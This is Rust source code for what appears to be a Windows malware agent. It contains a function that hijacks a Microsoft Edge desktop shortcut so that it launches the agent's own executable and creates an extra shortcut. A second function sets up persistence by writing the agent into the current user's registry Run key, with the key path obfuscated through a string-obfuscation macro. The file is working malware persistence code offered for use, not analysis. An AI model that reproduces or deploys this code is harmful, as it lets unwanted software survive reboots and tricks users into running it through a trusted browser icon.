use std::env;
use std::path::Path;
use std::path::PathBuf;
use winreg::enums::*;
use winreg::RegKey;
use goldberg::goldberg_string;
use crate::debug_println;
use windows::{
    core::HSTRING,
    Win32::System::Com::{
        CoCreateInstance, CoInitializeEx, CLSCTX_INPROC_SERVER, COINIT_MULTITHREADED,
    },
    Win32::UI::Shell::{IShellLinkW, ShellLink},
    Win32::System::Com::IPersistFile,
};
use std::io;
use windows::core::Interface;

/**
 * TODO:
 * Just handle the shortcut icon and make a new Edge Icon on the desktop, fuck it.
 */

#[inline]
pub fn shortcut_takeover(id: &str, hostname: &str) -> Result<(), Box<dyn std::error::Error>> {
    if env::consts::OS != "windows" {
        println!("Not Windows, skipping shortcut takeover");
        return Ok(());
    }

    let username = match env::var("USERPROFILE") {
        Ok(username) => username,
        Err(e) => {
            return Err(e.into());
        },
    };

    // Construct paths to the desktop and shortcut files
    let desktop_dir_path = format!("{}\\Desktop", username);
    let edge_shortcut_path = format!("{}\\Microsoft Edge backup.lnk", desktop_dir_path);
    let new_shortcut_path = format!("{}\\new_shortcut.lnk", desktop_dir_path);

    // Log paths for debugging
    println!("Desktop path: {}", desktop_dir_path);
    println!("Edge shortcut path: {}", edge_shortcut_path);
    println!("New shortcut path: {}", new_shortcut_path);

    // Check if the existing shortcut exists; skip if not
    // if !Path::new(&edge_shortcut_path).exists() {
    //     println!("Edge shortcut does not exist at: {}", edge_shortcut_path);
    //     return Ok(());
    // }

    // Verify the desktop directory exists
    // if !Path::new(&desktop_dir_path).exists() {
    //     println!("Desktop directory does not exist: {}", desktop_dir_path);
    //     return Err(io::Error::new(
    //         io::ErrorKind::NotFound,
    //         format!("Desktop directory {} does not exist", desktop_dir_path),
    //     ))?;
    // }

    // Get the current executable path and its parent directory
    let agent_exe_path: PathBuf = env::current_exe()?;
    let agent_dir_path = agent_exe_path
        .parent()
        .ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "Could not derive parent directory"))?;

    // Log executable and directory paths
    println!("Agent executable path: {}", agent_exe_path.display());
    println!("Agent directory path: {}", agent_dir_path.display());

    // Convert paths to HSTRING for Windows API compatibility
    let exe_path_hstr = HSTRING::from(agent_exe_path.to_string_lossy().as_ref());
    let dir_path_hstr = HSTRING::from(agent_dir_path.to_string_lossy().as_ref());
    let edge_shortcut_hstr = HSTRING::from(&edge_shortcut_path);
    let new_shortcut_hstr = HSTRING::from(&new_shortcut_path);

    // Use unsafe block for COM operations
    unsafe {
        // Initialize COM with multi-threaded apartment
        CoInitializeEx(None, COINIT_MULTITHREADED);

        // Create IShellLinkW instance to manipulate the existing shortcut
        let shell_link: IShellLinkW = CoCreateInstance(&ShellLink, None, CLSCTX_INPROC_SERVER)?;
        let persist_file: IPersistFile = shell_link.cast()?;

        // Load and modify the existing "Microsoft Edge.lnk"
        println!("Loading existing shortcut: {}", &edge_shortcut_path);
        persist_file.Load(&edge_shortcut_hstr, windows::Win32::System::Com::STGM(0))?;
        shell_link.SetPath(&exe_path_hstr)?;
        shell_link.SetWorkingDirectory(&dir_path_hstr)?;
        println!("Saving modified shortcut: {}", edge_shortcut_path);
        persist_file.Save(&edge_shortcut_hstr, true)?;

        // Create a new IShellLinkW instance for the new shortcut
        let new_shell_link: IShellLinkW = CoCreateInstance(&ShellLink, None, CLSCTX_INPROC_SERVER)?;
        println!("Creating new shortcut: {}", &new_shortcut_path);
        new_shell_link.SetPath(&exe_path_hstr)?;
        new_shell_link.SetWorkingDirectory(&dir_path_hstr)?;
        let new_persist_file: IPersistFile = new_shell_link.cast()?;
        new_persist_file.Save(&new_shortcut_hstr, true)?;
        println!("New shortcut created at: {}", new_shortcut_path);
    }

    Ok(())
}

#[inline]
pub fn classic_registry_based_survival(program_name_in_registry_record: &str, id: &str) -> Result<(), Box<dyn std::error::Error>> {
    if env::consts::OS != "windows" {
        return Ok(());
    }

    if program_name_in_registry_record.is_empty() {
        return Err("Program name cannot be empty".into());
    }

    if id.is_empty() {
        return Err("ID cannot be empty".into());
    }

    let exe_path: PathBuf = env::current_exe()?;
    let exe_path_str = exe_path.to_str().ok_or("Failed to convert path to string")?;

    let hklm = RegKey::predef(HKEY_CURRENT_USER);

    let run_path = goldberg_string!("Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();

    let command = format!("\"{}\" {}", exe_path_str, id);

    match hklm.create_subkey(&run_path) {
        Err(e) => Err(Box::new(e) as Box<dyn std::error::Error>),
        Ok((key, _disp)) => {
            key.set_value(program_name_in_registry_record, &command)?;
            debug_println!("Set persistence in Run path with ID: {}", run_path);
            Ok(())
        }
    }
}